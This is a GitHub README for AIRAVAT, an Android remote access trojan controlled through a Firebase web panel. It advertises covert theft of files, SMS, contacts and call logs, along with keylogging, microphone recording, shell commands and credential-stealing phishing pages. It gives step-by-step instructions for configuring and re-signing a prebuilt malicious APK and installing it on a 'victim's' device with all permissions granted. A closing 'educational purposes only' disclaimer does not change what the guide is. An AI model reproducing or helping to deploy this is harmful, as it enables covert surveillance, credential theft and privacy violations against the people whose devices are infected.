
<p align="center">
<img src='WEB PANEL/img/logo.png' style="height:100px;width:100px;" >
</p>
<h1 align=center>AIRAVAT</h1>

### A multifunctional Android RAT with GUI based Web Panel without port forwarding.

##### This project is not my design, but I have made modifications, improvements and continuous development

## Features
 - Read all the files of Internal Storage
 - Download Any Media to your Device from Victims Device
 - Get all the system information of Victim Device
 - Retrieve the List of Installed Applications
 - Retrive SMS
 - Retrive Call Logs
 - Retrive Contacts
 - Send SMS
 - Gets all the Notifications 
 - Keylogger
 - Admin Permission 
 - Show Phishing Pages to steal credentials through notification.
    - Steal credentials through pre built phishing pages
    - Open any suspicious website through notification to steal credentials.
 - Record Audio through Mic
 - Play music in Victim's device
 - Vibrate Device
 - Text To Speech 
 - Turn On/Off Torch Light
 - Change Wallpaper
 - Run shell Commands
 - Get Clipboard text (Only When app's Activity is visible)
 - Launch Any URL (Only When app's Activity is visible)
 - Runs In Background 
    - Auto Starts on restarting the device
    - Auto Starts when any notification arrives
    - Accepts name and photo changes
 - The victim cannot simply delete it
 - No port forwarding needed

<img align=center src=./.github/img.jpg >


## Requirements
 ### - Firebase Account
 - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows)
    - ( For PC )
 - [apkeditor](https://github.com/pashamasr01287654800/AIRAVAT/raw/refs/heads/main/com.gmail.heagoo.apkeditor.pro.apk)
    - ( for Android )


## How to Build 
  ### Firebase Setup
 1. Create an Firebase Account and afterwords create a new project with any name.
 1. Enable Firebase Database and Firebase Storage.
 1. In Firebase Database Click on the rules and set `.read` and `.write` to `true`
    - ```js
          {
           "rules": {
                   ".read": "true",
                   ".write": "true"
                    }
          }
      ```
 1. In Firebase Storage allow reads and writes for all paths.
    - ```js
        rules_version = '2';
        service firebase.storage {
        match /b/{bucket}/o {
            match /{allPaths=**} {
               allow read, write 
              }
          }
       }
      ```
 1. Now Go to project overview and create an Android App and download the `google-services.json` file.
 1. Also create a web app and copy the config of webapp.
   ### Panel Setup
 1. You can use Github Pages, Firebase Hosting or any hosting site or [com.phlox.simpleserver.apk](https://github.com/pashamasr01287654800/AIRAVAT/raw/refs/heads/main/com.phlox.simpleserver.apk) to host the board.
 1. Open [index.html](./WEB%20PANEL/index.html) File and from [line number 16](https://github.com/Th30neAnd0nly/AIRAVAT/blob/325ff0befec72a55c273e99a0e06059db9d599fb/WEB%20PANEL/index.html#L16) replace the config with your web app config which you have created on Step 6.
 1. Save the file , Your Panel Setup is completed.
 ### If you prefer use com.phlox.simpleserver.apk
 1. Install the application Simple HTTP Server
 1. Edit the Root folder path within the application to the WEB PANEL location
 1. Click START, then click 127.0.0.1 Go to any browser and paste the url And start
 ### Android RAT
  - Download [System.apk](https://github.com/pashamasr01287654800/AIRAVAT/raw/refs/heads/main/ANDROID%20APP/System.apk)
 1. Unpack or edit the apk using any software recommended above.
 1. Now open `res/values/strings.xml` file.
 1. Replace values of `firebase_database_url ` , `google_api_key` , `google_app_id` , `google_storage_bucket` , `project_id`
 1. with your Firebase Account using `google-services.json` file which you have downloaded on step 5 from the Firebase Setup stage
    - Example 
       ```xml 
       <string name="firebase_database_url">https://your_databaseURL.firebase.com</string>
       <string name="google_api_key">your_apiKey</string>
       <string name="google_app_id">your_appId</string>
       <string name="google_storage_bucket">your_storageBucket</string>
       <string name="project_id">your_projectId</string>
       ```
 1. After saving the changes, in the strings.xml file
 1. Click on Smali
 1. Click on the key sign that means apk assembly. & Compile/sign the apk file.
 1. Install the app in victim's device and give all the permissions after that the connection will show up in web panel.

### ❤️Supporters❤️
[![Stargazers repo roster for @th30neand0nly/AIRAVAT](https://reporoster.com/stars/dark/Th30neAnd0nly/AIRAVAT)](https://github.com/Th30neAnd0nly/AIRAVAT/stargazers)

[![Forkers repo roster for @th30neand0nly/AIRAVAT](https://reporoster.com/forks/dark/Th30neAnd0nly/AIRAVAT)](https://github.com/Th30neAnd0nly/AIRAVAT/network/members)



## DISCLAIMER
<p align="center">
 TO BE USED FOR EDUCATIONAL PURPOSES ONLY
</p>


The use of the AIRAVAT is COMPLETE RESPONSIBILITY of the END-USER. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program. Please read [LICENSE](LICENSE).








